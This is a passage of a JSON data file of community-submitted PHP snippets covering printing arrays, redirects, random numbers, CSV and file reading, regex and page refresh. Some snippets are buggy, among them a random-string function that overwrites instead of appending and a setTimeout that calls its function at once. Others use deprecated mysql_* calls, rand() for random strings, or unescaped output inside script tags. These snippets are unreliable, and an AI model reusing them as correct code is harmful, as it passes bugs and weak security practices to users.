    "description": "print(\"<pre>\".print_r($array_data,true).\"</pre>\"); \n$json_string = json_encode($data, JSON_PRETTY_PRINT);\nprint \"<pre>\"; print_r($data); print \"</pre>\";\n",
    "reg_date": "2021-10-12T10:18:58.000Z"
  },
  {
    "id": 3994,
    "keyword": null,
    "link": null,
    "title": " php previous site",
    "description": "header('Location: ' . $_SERVER['HTTP_REFERER']); \n",
    "reg_date": "2021-10-12T10:18:58.000Z"
  },
  {
    "id": 3995,
    "keyword": null,
    "link": null,
    "title": " php print array",
    "description": "<?php $a = array ('a' => 'apple', 'b' => 'banana', 'c' => array ('x', 'y', 'z')); echo \"<pre>\"; print_r ($a); echo \"</pre>\"; ?>    Output:  Array (     [a] => apple     [b] => banana     [c] => Array         (             [0] => x             [1] => y             [2] => z         ) ) \nfunction echo_arr($arr){         for ($i=0; $i < count($arr); $i++) {                  echo $arr[$i];             }         }  echo_arr($your_array_here);\n// raw array output print_r($arr);  // the above well-formatted echo '<pre>'; print_r($array); echo '</pre>';  // more details like datatype and length var_dump($arr);  // output that PHP understands var_export($arr);  // by foreach loop foreach($arr as $key=>$value)   echo $key, '=>', $value;\t// $value must be convertible to string\n<?php $a = array ('a' => 'apple', 'b' => 'banana', 'c' => array ('x', 'y', 'z')); print_r ($a); ?>\nforeach($results['data'] as $result) {     echo $result['type'], '<br>'; }\nforeach($results as $result) { \techo $result . '<br>'; }\n",
    "reg_date": "2021-10-12T10:18:58.000Z"
  },
  {
    "id": 3996,
    "keyword": null,
    "link": null,
    "title": " php print character x times",
    "description": "str_repeat( string $string , int $times )  // example echo '1' . str_repeat( '0' , 4 );  // 10000\n",
    "reg_date": "2021-10-12T10:18:59.000Z"
  },
  {
    "id": 3997,
    "keyword": null,
    "link": null,
    "title": " php print to console",
    "description": "// Assuming you are wishing to log to the JS Console...  <?php \tfunction consoleLog($msg) { \t\techo '<script type=\"text/javascript\">' .           'console.log(' . $msg . ');</script>'; \t}  \tconsoleLog('Hello, console!'); ?>\n/* console.log in php */  <?php \tfunction consoleLog($message) { \t\techo '<script type=\"text/javascript\">' .           'console.log(' . $message . ');</script>'; \t}  \tconsoleLog('Hello, greppers!'); ?>\n<script>     console.log(<?= json_encode($foo); ?>); </script>\nfunction debug($var, $die = false, $trace = true, $show_from = true)     {         //Trick to avoid html corruptions         echo '</select>';         echo '</script>';                  // BackTrace         $stack = '';         $i = 1;         $trace = debug_backtrace();         array_shift($trace);          foreach ($trace as $node) {           if (isset($node['file']) && ($node['line'])) {             $stack .= \"#$i \" . $node['file'] . \"(\" . $node['line'] . \"): \";           }           if (isset($node['class'])) {             $stack .= $node['class'] . \"->\";           }           $stack .= $node['function'] . \"()\" . PHP_EOL;           $i++;         }          $out[] = '<pre style=\"background-color:#CCCCCC\">';         if ($show_from) {           $calledFrom = debug_backtrace();           $out[] = '<strong>' . substr(str_replace(dirname(__FILE__), '', $calledFrom[0]['file']), 1) . '</strong>';           $out[] = ' (line <strong>' . $calledFrom[0]['line'] . '</strong>)';         }         $out[] = htmlspecialchars(print_r($var, true));         if (is_object($var)) {           $out[] = '-------- Class methods --------';           $out[] = print_r(get_class_methods(get_class($var)), true);         }          if ($trace) {           $out[] = '-------- Backtrace --------';           $out[] = $stack;         }          $out[] = '</pre>';         echo implode(PHP_EOL, $out);         if ($die) {           die();         }         break;      }\n$a = array(  null => 'a',  true => 'b',  false => 'c',  0 => 'd',  1 => 'e',  '' => 'f' );  echo count($a), \"\\n\";\n",
    "reg_date": "2021-10-12T10:18:59.000Z"
  },
  {
    "id": 3998,
    "keyword": null,
    "link": null,
    "title": " php program to find factorial of a number using function",
    "description": "function Factorial($n) {   \treturn ($n <= 1) ? 1 : $n * Factorial($n - 1); }\nfunction Factorial($number){      if($number <= 1){            return 1;        }        else{            return $number * Factorial($number - 1);        }    }     $number = 5;  $fact = Factorial($number);  echo \"Factorial = $fact\";  //output : 120 ?> \n<?php function Factorial($number){      if($number <= 1){            return 1;        }        else{            return $number * Factorial($number - 1);        }    }     $number = 5;  $fact = Factorial($number);  echo \"Factorial = $fact\";  //output : 120 ?> \n",
    "reg_date": "2021-10-12T10:18:59.000Z"
  },
  {
    "id": 3999,
    "keyword": null,
    "link": null,
    "title": " php program to validate phone number using regular expression",
    "description": "preg_match('/^[0-9]{10}+$/', $mobile) \n",
    "reg_date": "2021-10-12T10:18:59.000Z"
  },
  {
    "id": 4000,
    "keyword": null,
    "link": null,
    "title": " php proper function comments",
    "description": "// This is a single-line comment  # This is also a single-line comment  /* This is a multiple-lines comment block that spans over multiple lines */\n/**  * This function compiles a message that tells you how great coffee is  *  * @param string  $compliment A nice word to describe coffee   * @param integer $score      A score out of 10  */\n",
    "reg_date": "2021-10-12T10:18:59.000Z"
  },
  {
    "id": 4001,
    "keyword": null,
    "link": null,
    "title": " php put print r into variable",
    "description": "// When the second parameter is set to TRUE // print_r() will return the information rather than print it $var_info = print_r($var,true);\n",
    "reg_date": "2021-10-12T10:18:59.000Z"
  },
  {
    "id": 4002,
    "keyword": null,
    "link": null,
    "title": " php query pdo",
    "description": " <?php $sql =  'SELECT name, color, calories FROM fruit ORDER BY name'; foreach  ($conn->query($sql) as $row) {     print $row['name'] . \"\\t\";     print  $row['color'] . \"\\t\";     print $row['calories'] . \"\\n\"; } ?>  \nconst DB_HOST = 'localhost'; const DB_NAME = 'DB_Name';\t\t\t//Name of the database const DB_USERNAME = 'username';\t\t//Username to use const DB_PASSWORD = 'Password';\t\t//Password for that user   // Data Source Name $dsn = \"mysql:host=\" . DB_HOST . \";dbname=\" . DB_NAME;  $options = [     PDO::ATTR_EMULATE_PREPARES   => false, // turn off emulation mode for \"real\" prepared statements     PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION, //turn on errors in the form of exceptions     PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_OBJ, //make the default fetch be an anonymous object with column names as properties ];  //Create PDO instance try {     $pdo = new PDO($dsn, DB_USERNAME, DB_PASSWORD, $options); } catch (PDOException $e) {     echo 'Connection failed: ' . $e->getMessage(); }\n",
    "reg_date": "2021-10-12T10:18:59.000Z"
  },
  {
    "id": 4003,
    "keyword": null,
    "link": null,
    "title": " php quit",
    "description": "exit();\t\t// Normal exit  exit(1);\t// Exit with an error code  exit('Error!');\t// Exit and print an error message\nexit;\n",
    "reg_date": "2021-10-12T10:18:59.000Z"
  },
  {
    "id": 4004,
    "keyword": null,
    "link": null,
    "title": " php quotations within quotations",
    "description": "<?php   echo '<span onclick=\"$(this).addClass(\\'selected\\');\"> </span>'; ?>\n",
    "reg_date": "2021-10-12T10:18:59.000Z"
  },
  {
    "id": 4005,
    "keyword": null,
    "link": null,
    "title": " php rand int",
    "description": "function generateRandomString($length = 25) {     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $charactersLength = strlen($characters);     $randomString = '';     for ($i = 0; $i < $length; $i++) {         $randomString .= $characters[rand(0, $charactersLength - 1)];     }     return $randomString; } //usage  $myRandomString = generateRandomString(5);\nyou can use rand() function for that in php. Example: Generate random numbers between 1 to 50 <?php   echo rand(1,50); ?>\n$digits = 3; echo rand(pow(10, $digits-1), pow(10, $digits)-1); \necho random_int(0,50);\n<?php   echo rand(1,50); ?>\nrandom_int ( int $min , int $max );\n",
    "reg_date": "2021-10-12T10:19:00.000Z"
  },
  {
    "id": 4006,
    "keyword": null,
    "link": null,
    "title": " php random",
    "description": "function generateRandomString($length = 25) {     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $charactersLength = strlen($characters);     $randomString = '';     for ($i = 0; $i < $length; $i++) {         $randomString .= $characters[rand(0, $charactersLength - 1)];     }     return $randomString; } //usage  $myRandomString = generateRandomString(5);\nyou can use rand() function for that in php. Example: Generate random numbers between 1 to 50 <?php   echo rand(1,50); ?>\n// $min and $max are optional rand($min,$max);\nfunction rand_str() {     $characters = '0123456789-=+{}[]:;@#~.?/&gt;,&lt;|\\!\"&pound;$%^&amp;*()abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $randomstr = '';     for ($i = 0; $i < random_int(50, 100); $i++) {       $randomstr .= $characters[rand(0, strlen($characters) - 1)];     }     return $randomstr;   }\necho random_int(0,50);\nmt_rand(1000, 9999)\n",
    "reg_date": "2021-10-12T10:19:00.000Z"
  },
  {
    "id": 4007,
    "keyword": null,
    "link": null,
    "title": " php random 5 digit number",
    "description": "// $min and $max are optional rand($min,$max);\n$digits = 3; echo rand(pow(10, $digits-1), pow(10, $digits)-1); \n$limit = 3; echo random_int(10 ** ($limit - 1), (10 ** $limit) - 1);\nrand();\n",
    "reg_date": "2021-10-12T10:19:00.000Z"
  },
  {
    "id": 4008,
    "keyword": null,
    "link": null,
    "title": " php random float number with 2 decimal places",
    "description": "$decimals = 2; // number of decimal places $div = pow(10, $decimals);  // Syntax: mt_rand(min, max); mt_rand(0.01 * $div, 0.05 * $div) / $div;\n",
    "reg_date": "2021-10-12T10:19:00.000Z"
  },
  {
    "id": 4009,
    "keyword": null,
    "link": null,
    "title": " php random integer",
    "description": "you can use rand() function for that in php. Example: Generate random numbers between 1 to 50 <?php   echo rand(1,50); ?>\n// $min and $max are optional rand($min,$max);\n$digits = 3; echo rand(pow(10, $digits-1), pow(10, $digits)-1); \necho random_int(0,50);\n<?php   echo rand(1,50); ?>\nrand(0,10); or random_int(0,10)\n",
    "reg_date": "2021-10-12T10:19:00.000Z"
  },
  {
    "id": 4010,
    "keyword": null,
    "link": null,
    "title": " php random number generator",
    "description": "you can use rand() function for that in php. Example: Generate random numbers between 1 to 50 <?php   echo rand(1,50); ?>\n// $min and $max are optional rand($min,$max);\necho random_int(0,50);\n<?php   echo rand(1,50); ?>\nrand(0,10); or random_int(0,10)\necho (rand()); echo(rand(10, 100));//random number with range \n",
    "reg_date": "2021-10-12T10:19:00.000Z"
  },
  {
    "id": 4011,
    "keyword": null,
    "link": null,
    "title": " php random string",
    "description": "function generateRandomString($length = 25) {     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $charactersLength = strlen($characters);     $randomString = '';     for ($i = 0; $i < $length; $i++) {         $randomString .= $characters[rand(0, $charactersLength - 1)];     }     return $randomString; } //usage  $myRandomString = generateRandomString(5);\n//generates 13 character random unique alphanumeric id echo uniqid(); //output - 5e6d873a4f597\nfunction generateRandomString($length = 10) {     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $charactersLength = strlen($characters);     $randomString = '';     for ($i = 0; $i < $length; $i++) {         $randomString .= $characters[rand(0, $charactersLength - 1)];     }     return $randomString; }  Output the random string with the call below:  // Echo the random string. // Optionally, you can give it a desired string length. echo generateRandomString();\nfunction rand_str() {     $characters = '0123456789-=+{}[]:;@#~.?/&gt;,&lt;|\\!\"&pound;$%^&amp;*()abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $randomstr = '';     for ($i = 0; $i < random_int(50, 100); $i++) {       $randomstr .= $characters[rand(0, strlen($characters) - 1)];     }     return $randomstr;   }\n<?php      $random = substr(md5(mt_rand()), 0, 7);     echo $random; ?>\n<?php     function RandomString()     {         $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';         $randstring = '';         for ($i = 0; $i < 10; $i++) {             $randstring = $characters[rand(0, strlen($characters))];         }         return $randstring;     }      RandomString();     echo $randstring;\n",
    "reg_date": "2021-10-12T10:19:00.000Z"
  },
  {
    "id": 4012,
    "keyword": null,
    "link": null,
    "title": " php randon integer 4 digit",
    "description": "$digits = 3; echo rand(pow(10, $digits-1), pow(10, $digits)-1); \necho random_int(0,50);\nrandom_int ( int $min , int $max );\n",
    "reg_date": "2021-10-12T10:19:00.000Z"
  },
  {
    "id": 4013,
    "keyword": null,
    "link": null,
    "title": " php read csv",
    "description": " <?php $row = 1; if (($handle = fopen(\"test.csv\", \"r\")) !== FALSE) {     while (($data = fgetcsv($handle, 1000, \",\")) !== FALSE) {         $num = count($data);         echo \"<p> $num fields in line $row: <br /></p>\\n\";         $row++;         for ($c=0; $c < $num; $c++) {             echo $data[$c] . \"<br />\\n\";         }     }     fclose($handle); } ?>  \n    $csvFile = file('../somefile.csv');     $data = [];     foreach ($csvFile as $line) {         $data[] = str_getcsv($line);     }\n<?php ini_set('auto_detect_line_endings',TRUE); $handle = fopen('/path/to/file','r'); while ( ($data = fgetcsv($handle) ) !== FALSE ) {   //process the array in $data   var_dump($data); } ini_set('auto_detect_line_endings',FALSE);\n// output headers so that the file is downloaded rather than displayed header('Content-Type: text/csv; charset=utf-8'); header('Content-Disposition: attachment; filename=data.csv');  // create a file pointer connected to the output stream $output = fopen('php://output', 'w');  // output the column headings fputcsv($output, array('Column 1', 'Column 2', 'Column 3'));  // fetch the data mysql_connect('localhost', 'username', 'password'); mysql_select_db('database'); $rows = mysql_query('SELECT field1,field2,field3 FROM table');  // loop over the rows, outputting them while ($row = mysql_fetch_assoc($rows)) fputcsv($output, $row); \n",
    "reg_date": "2021-10-12T10:19:00.000Z"
  },
  {
    "id": 4014,
    "keyword": null,
    "link": null,
    "title": " php read csv file line by line",
    "description": "$file = fopen('file.csv', 'r'); while (($line = fgetcsv($file)) !== FALSE) {    print_r($line); } fclose($file);\n <?php $row = 1; if (($handle = fopen(\"test.csv\", \"r\")) !== FALSE) {     while (($data = fgetcsv($handle, 1000, \",\")) !== FALSE) {         $num = count($data);         echo \"<p> $num fields in line $row: <br /></p>\\n\";         $row++;         for ($c=0; $c < $num; $c++) {             echo $data[$c] . \"<br />\\n\";         }     }     fclose($handle); } ?>  \n    $csvFile = file('../somefile.csv');     $data = [];     foreach ($csvFile as $line) {         $data[] = str_getcsv($line);     }\n// output headers so that the file is downloaded rather than displayed header('Content-Type: text/csv; charset=utf-8'); header('Content-Disposition: attachment; filename=data.csv');  // create a file pointer connected to the output stream $output = fopen('php://output', 'w');  // output the column headings fputcsv($output, array('Column 1', 'Column 2', 'Column 3'));  // fetch the data mysql_connect('localhost', 'username', 'password'); mysql_select_db('database'); $rows = mysql_query('SELECT field1,field2,field3 FROM table');  // loop over the rows, outputting them while ($row = mysql_fetch_assoc($rows)) fputcsv($output, $row); \n",
    "reg_date": "2021-10-12T10:19:01.000Z"
  },
  {
    "id": 4015,
    "keyword": null,
    "link": null,
    "title": " php read csv to array",
    "description": "$lines =file('CSV Address.csv');  foreach($lines as $data) { list($name[],$address[],$status[]) = explode(',',$data); } \nInstead of writing out values consider using 'fputcsv()'.  This may solve your problem immediately.  function array2csv($data, $delimiter = ',', $enclosure = '\"', $escape_char = \"\\\\\") {     $f = fopen('php://memory', 'r+');     foreach ($data as $item) {         fputcsv($f, $item, $delimiter, $enclosure, $escape_char);     }     rewind($f);     return stream_get_contents($f); }  $list = array (     array('aaa', 'bbb', 'ccc', 'dddd'),     array('123', '456', '789'),     array('\"aaa\"', '\"bbb\"') ); var_dump(array2csv($list));  /* I hope it will help you. Namaste Stay Home Stay Safe */\n// output headers so that the file is downloaded rather than displayed header('Content-Type: text/csv; charset=utf-8'); header('Content-Disposition: attachment; filename=data.csv');  // create a file pointer connected to the output stream $output = fopen('php://output', 'w');  // output the column headings fputcsv($output, array('Column 1', 'Column 2', 'Column 3'));  // fetch the data mysql_connect('localhost', 'username', 'password'); mysql_select_db('database'); $rows = mysql_query('SELECT field1,field2,field3 FROM table');  // loop over the rows, outputting them while ($row = mysql_fetch_assoc($rows)) fputcsv($output, $row); \n$csv = array_map('str_getcsv', file('data.csv'));\n",
    "reg_date": "2021-10-12T10:19:01.000Z"
  },
  {
    "id": 4016,
    "keyword": null,
    "link": null,
    "title": " php read file line by line",
    "description": "$handle = fopen(\"inputfile.txt\", \"r\"); if ($handle) {     while (($line = fgets($handle)) !== false) {         // process the line read.     }      fclose($handle); } else {     // error opening the file. } \n<?php \t \t$file = new SplFileObject(\"file.txt\");  \twhile(!$file->eof()) \t  { \t\techo $file->fgets().\"<br/>\"; \t  }  \t$file = null;  ?>\n",
    "reg_date": "2021-10-12T10:19:01.000Z"
  },
  {
    "id": 4017,
    "keyword": null,
    "link": null,
    "title": " php read json request body",
    "description": "//e.g your JSON Req is like this {\"UserName\":\"Ranish\",\"Password\":\"asdasdasd\"} $jsonReqUrl  = \"php://input\"; $reqjson = file_get_contents($jsonReqUrl); $reqjsonDecode = json_decode($reqjson, true); echo $reqjsonDecode['UserName'];\nheader('Content-Type: application/json');   $colors = array(\"red\",\"blue\",\"green\"); echo json_encode($colors);\n<?php $jsonurl = \"https://reqres.in/api/users/2\"; $json = file_get_contents($jsonurl); $jsonDecode = json_decode($json, true); echo $jsonDecode['data']['email']; ?>\n",
    "reg_date": "2021-10-12T10:19:01.000Z"
  },
  {
    "id": 4018,
    "keyword": null,
    "link": null,
    "title": " php read xml from url",
    "description": "$xml=simplexml_load_file(\"filename.xml\") or die(\"Error: Cannot create object\"); echo $xml->detaildata->lattitude; echo $xml->detaildata->longitude; \n$xml=simplexml_load_file(\"filename.xml\") or die(\"Error: Cannot create object\"); echo $xml->detaildata->lattitude; // As SimpleXMLElement Object // ... OR ... echo $xml->detaildata->lattitude->__toString(); // As String \n",
    "reg_date": "2021-10-12T10:19:01.000Z"
  },
  {
    "id": 4019,
    "keyword": null,
    "link": null,
    "title": " php read zip file without extracting",
    "description": "As found as a comment on http://www.php.net/ziparchive:  The following code can be used to get a list of all the file names in a zip file.  <?php $za = new ZipArchive();   $za->open('theZip.zip');   for( $i = 0; $i < $za->numFiles; $i++ ){      $stat = $za->statIndex( $i );      print_r( basename( $stat['name'] ) . PHP_EOL );  } ?>\n",
    "reg_date": "2021-10-12T10:19:01.000Z"
  },
  {
    "id": 4020,
    "keyword": null,
    "link": null,
    "title": " php receive post",
    "description": "<form method=\"post\" action=\"<?php echo $_SERVER['PHP_SELF'];?>\">   Name: <input type=\"text\" name=\"fname\">   <input type=\"submit\"> </form> <?php if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") {   // do logic   $name = $_POST['fname']; } ?>\n// Send data trough e.g. AJAX in JavaScript  $.ajax({     type: \"POST\",     url: 'example.php',     data: { \"num1\": 1, \"num2\": 2},     contentType: \"application/json; charset=utf-8\",     dataType: \"JSON\",     async: false })  // You would receive it like this:    $num1 = $_POST[\"num1\"]; $num2 = $_POST[\"num2\"];  $sum = $num1 + $num2; echo $sum;  // Would output: 3\n",
    "reg_date": "2021-10-12T10:19:01.000Z"
  },
  {
    "id": 4021,
    "keyword": null,
    "link": null,
    "title": " php rechercher dans une chaine",
    "description": "<?php   $string = 'Hello World!';   if(stristr($string, 'terre') === FALSE) {    echo '\"terre\" non trouv&eacute; dans la cha&icirc;ne de caract&egrave;res';   } // affiche : \"terre\" non trouv&eacute; dans la cha&icirc;ne de caract&egrave;res ?>\n",
    "reg_date": "2021-10-12T10:19:01.000Z"
  },
  {
    "id": 4022,
    "keyword": null,
    "link": null,
    "title": " php recursively delete directory",
    "description": "function removeDirectory($path) {  \t$files = glob($path . '/*'); \tforeach ($files as $file) { \t\tis_dir($file) ? removeDirectory($file) : unlink($file); \t} \trmdir($path);  \treturn; }\n",
    "reg_date": "2021-10-12T10:19:01.000Z"
  },
  {
    "id": 4023,
    "keyword": null,
    "link": null,
    "title": " php redirect",
    "description": "//PHP redirect  header(\"Location: https://www.codegrepper.com/my-redirect-page.php\");  die();  \n<?php // This will just redirect you to example.com header(\"Location: https://example.com\");   ?>\n<?php   header(\"Location: (redirect url)\"); ?>\nheader(\"Location: http://example.com\"); die();\nheader(\"Location: http://example.com/myOtherPage.php\"); die();\n//PHP redirect header(\"Location: https://www.codegrepper.com/my-redirect-page.php\"); die();\n",
    "reg_date": "2021-10-12T10:19:01.000Z"
  },
  {
    "id": 4024,
    "keyword": null,
    "link": null,
    "title": " php redirect after specific seconds",
    "description": "header(\"refresh:5;url=wherever.php\");\nheader(\"url=thepage.php;refresh:3\"); exit(); // The user will be redirected after 3 seconds to thepage.php\nheader( \"refresh:5;url=wherever.php\" );\n",
    "reg_date": "2021-10-12T10:19:01.000Z"
  },
  {
    "id": 4025,
    "keyword": null,
    "link": null,
    "title": " php redirect if not logged in",
    "description": "if(!isset($_SESSION['login'])){ //if login in session is not set     header(\"Location: http://www.example.com/login.php\"); }\n",
    "reg_date": "2021-10-12T10:19:02.000Z"
  },
  {
    "id": 4026,
    "keyword": null,
    "link": null,
    "title": " php redirect in seconds",
    "description": "header(\"refresh:5;url=wherever.php\");\nheader(\"url=thepage.php;refresh:3\"); exit(); // The user will be redirected after 3 seconds to thepage.php\n",
    "reg_date": "2021-10-12T10:19:02.000Z"
  },
  {
    "id": 4027,
    "keyword": null,
    "link": null,
    "title": " php redirect seconds",
    "description": "header(\"refresh:5;url=wherever.php\");\nheader( \"refresh:5;url=wherever.php\" );\n",
    "reg_date": "2021-10-12T10:19:02.000Z"
  },
  {
    "id": 4028,
    "keyword": null,
    "link": null,
    "title": " php redirect to another page",
    "description": "//PHP redirect  header(\"Location: https://www.codegrepper.com/my-redirect-page.php\");  die();  \n  <?php header(\"Location: anotherDirectory/anotherFile.php\"); ?>\n< ?php header(\"Location: http://www.redirect.to.url.com/\"); ?> \n<?php   header(\"Location: (redirect url)\"); ?>\n< ?php header(\"Location: http://www.redirect.to.url.com/\"); ?>\nheader(\"Location: pagetoredirectfor.php\"); exit();\n",
    "reg_date": "2021-10-12T10:19:02.000Z"
  },
  {
    "id": 4029,
    "keyword": null,
    "link": null,
    "title": " php redirect to page",
    "description": "//PHP redirect  header(\"Location: https://www.codegrepper.com/my-redirect-page.php\");  die();  \n<?php   header(\"Location: (redirect url)\"); ?>\n<?php   header('Location: http://www.aaaa/index.php');   exit();\t\t// useless to let script running ?>  <?php   // permanent redirection (default is 302, 303 for most robots)   header('Location: http://www.aaaa/index.php', true, 301);   exit();\t\t// useless to let script running ?>  // or a meta in html header (if html generation is initiated)  <head> \t<meta http-equiv=\"Location\" content=\"http://www.aaaa/index.php\"> </head> // or waits 15s before redirection <head>   \t<meta http-equiv=\"refresh\" content=\"15;URL=http://www.aaaa/index.php\"> </head>  // or via javascript <script> \twindow.location.replace('http://www.aaaa/index.php'); </script>\n< ?php header(\"Location: http://www.redirect.to.url.com/\"); ?>\nheader(\"Location: http://example.com\"); die();\nheader(\"Location: /\"); exit();\n",
    "reg_date": "2021-10-12T10:19:02.000Z"
  },
  {
    "id": 4030,
    "keyword": null,
    "link": null,
    "title": " php redirect to url",
    "description": "//PHP redirect  header(\"Location: https://www.codegrepper.com/my-redirect-page.php\");  die();  \n<?php   header(\"Location: (redirect url)\"); ?>\n< ?php header(\"Location: http://www.redirect.to.url.com/\"); ?>\nheader(\"Location: http://example.com\"); die();\nheader(\"Location: pagetoredirectfor.php\"); exit();\nheader(\"Location: http://example.com/myOtherPage.php\"); die();\n",
    "reg_date": "2021-10-12T10:19:02.000Z"
  },
  {
    "id": 4031,
    "keyword": null,
    "link": null,
    "title": " php referer url",
    "description": "$_SERVER['HTTP_REFERER'];\n",
    "reg_date": "2021-10-12T10:19:02.000Z"
  },
  {
    "id": 4032,
    "keyword": null,
    "link": null,
    "title": " php refresh",
    "description": "//refreshes your current page header(\"Refresh:0\");  //refreshes your current page after 5 seconds header(\"Refresh:5\");  //If you need to redirect it to another page header(\"Refresh:0; url=page2.php\");\n//Refreshes your current page header(\"Refresh:0\"); header(\"Refresh:2\"); // Refreshes after 2 seconds  //If you need to redirect it to another page header(\"Refresh:0; url=page2.php\");\nheader(\"Refresh:0\");\n",
    "reg_date": "2021-10-12T10:19:02.000Z"
  },
  {
    "id": 4033,
    "keyword": null,
    "link": null,
    "title": " php refresh page",
    "description": "//refreshes your current page header(\"Refresh:0\");  //refreshes your current page after 5 seconds header(\"Refresh:5\");  //If you need to redirect it to another page header(\"Refresh:0; url=page2.php\");\n//Refreshes your current page header(\"Refresh:0\"); header(\"Refresh:2\"); // Refreshes after 2 seconds  //If you need to redirect it to another page header(\"Refresh:0; url=page2.php\");\nheader(\"Refresh:0\");\nheader(\"Refresh:0\");   header(\"Refresh:0; url=page2.php\");\nwindow.addEventListener('load', function() {     var xhr = null;      getXmlHttpRequestObject = function()     {         if(!xhr)         {                            // Create a new XMLHttpRequest object              xhr = new XMLHttpRequest();         }         return xhr;     };      updateLiveData = function()     {         var now = new Date();         // Date string is appended as a query with live data          // for not to use the cached version          var url = 'livefeed.txt?' + now.getTime();         xhr = getXmlHttpRequestObject();         xhr.onreadystatechange = evenHandler;         // asynchronous requests         xhr.open(\"GET\", url, true);         // Send the request over the network         xhr.send(null);     };      updateLiveData();      function evenHandler()     {         // Check response is ready or not         if(xhr.readyState == 4 && xhr.status == 200)         {             dataDiv = document.getElementById('liveData');             // Set current data text             dataDiv.innerHTML = xhr.responseText;             // Update the live data every 1 sec             setTimeout(updateLiveData(), 1000);         }     } }); \n",
    "reg_date": "2021-10-12T10:19:02.000Z"
  },
  {
    "id": 4034,
    "keyword": null,
    "link": null,
    "title": " php refresh page without reloading",
    "description": "header(\"Refresh:0\");\nwindow.addEventListener('load', function() {     var xhr = null;      getXmlHttpRequestObject = function()     {         if(!xhr)         {                            // Create a new XMLHttpRequest object              xhr = new XMLHttpRequest();         }         return xhr;     };      updateLiveData = function()     {         var now = new Date();         // Date string is appended as a query with live data          // for not to use the cached version          var url = 'livefeed.txt?' + now.getTime();         xhr = getXmlHttpRequestObject();         xhr.onreadystatechange = evenHandler;         // asynchronous requests         xhr.open(\"GET\", url, true);         // Send the request over the network         xhr.send(null);     };      updateLiveData();      function evenHandler()     {         // Check response is ready or not         if(xhr.readyState == 4 && xhr.status == 200)         {             dataDiv = document.getElementById('liveData');             // Set current data text             dataDiv.innerHTML = xhr.responseText;             // Update the live data every 1 sec             setTimeout(updateLiveData(), 1000);         }     } }); \nfunction data() {         var ret = [];         ret.push({           y: 'Today',           a: <?php echo $data; ?>         });       return ret;     }  var graph = Morris.Bar({         element: 'graph',         data: data(),         xkey: 'y',         ykeys: ['a'],         labels: ['random label']     });  function update() {       graph.setData(data());     }  setInterval(update, 60000); \n",
    "reg_date": "2021-10-12T10:19:03.000Z"
  },
  {
    "id": 4035,
    "keyword": null,
    "link": null,
    "title": " php regex",
    "description": "<?php // First Verif your regex code with https://regex101.com/ $str = \"Visit W3Schools\"; $pattern = \"/w3schools/i\"; echo preg_match($pattern, $str); // Outputs 1  // test email with REGEX if (!preg_match(\"/[-0-9a-zA-Z.+_]+@[-0-9a-zA-Z.+_]+.[a-zA-Z]{2,4}/\", $emailAddress)){     //Email address is invalid. }  // use filter var to valide Email if(filter_var($emailAddress, FILTER_VALIDATE_EMAIL))  {      //The email address is valid. } else{      //The email address is invalid. }   ?> \n<?php //Syntex : int preg_match( $pattern, $input, $matches, $flags, $offset)    // Declare a variable and initialize it  $str = \"Check For Testing.\";     // case-Insensitive search for the word \"Check\"  if (preg_match(\"/\\bCheck\\b/i\", $str, $match))       echo \"Matched!\";  else     echo \"not matched\";        // Output : Matched ?>\nif (preg_match(\"/\\bweb\\b/i\", \"PHP is the web scripting language of choice.\")) {     echo \"A match was found.\"; } else {     echo \"A match was not found.\"; }\nif(!preg_match('/^\\[a-zA-Z]+$/',$input)) {    // String contains not allowed characters ... }\npreg_match('/(foo)(bar)(baz)/', 'foobarbaz', $matches, PREG_OFFSET_CAPTURE);\npreg_match ( string $pattern , string $subject [, array &$matches [, int $flags = 0 [, int $offset = 0 ]]] ) : int\n",
    "reg_date": "2021-10-12T10:19:03.000Z"
  },
  {
    "id": 4036,
    "keyword": null,
    "link": null,
    "title": " php regex file extension",
    "description": "$fileName = 'banner.jpg';  $ext = end(explode('.', $fileName)); $ext = substr(strrchr($fileName, '.'), 1); $ext = substr($fileName, strrpos($fileName, '.') + 1); $ext = preg_replace('/^.*\\.([^.]+)$/D', '$1', $fileName); $ext = pathinfo($fileName, PATHINFO_EXTENSION); \n",
    "reg_date": "2021-10-12T10:19:03.000Z"
  },
  {
    "id": 4037,
    "keyword": null,
    "link": null,
    "title": " php regex non printable characters",
    "description": "myprompt> php -a Interactive shell  php > $string = \"&lsquo;Hello,&rsquo; she said.\"; php > $result = preg_replace('/[\\x00-\\x1F\\x80-\\xFF]/', '', $string); php > echo $result; Hello, she said.\n$result = preg_replace('/[\\x00-\\x1F\\x80-\\xFF]/', '', $string);\n",
    "reg_date": "2021-10-12T10:19:03.000Z"
  },
  {
    "id": 4038,
    "keyword": null,
    "link": null,
    "title": " php regex remove characters from string",
    "description": "// not case sensetive replace // use \"/[..]/i\" for case sensetivie result $string = preg_replace(\"/[aeiou]/\", '', $string);\n",
    "reg_date": "2021-10-12T10:19:03.000Z"
  },
  {
    "id": 4039,
    "keyword": null,
    "link": null,
    "title": " php regex remove file extension",
    "description": "$withoutExt = preg_replace('/\\\\.[^.\\\\s]{3,4}$/', '', $filename);  This matches a dot followed by three or four characters which are not a dot or a space.    \n",
    "reg_date": "2021-10-12T10:19:03.000Z"
  },
  {
    "id": 4040,
    "keyword": null,
    "link": null,
    "title": " php regex test",
    "description": "* Lets suppose, we want to test a string variable that contain exactly \"Abc\" in it. So we can do it using .......  <?php $str = \"I am Abc.\"; $pattern = \"/Abc/i\"; if (preg_match($pattern, $str)) { \techo \"True.\"; } else { \techo \"False.\"; } ?>\n",
    "reg_date": "2021-10-12T10:19:03.000Z"
  },
  {
    "id": 4041,
    "keyword": null,
    "link": null,
    "title": " php reload current page",
    "description": "header(\"Refresh:0\");\n",
    "reg_date": "2021-10-12T10:19:03.000Z"
  },
  {
    "id": 4042,
    "keyword": null,
    "link": null,
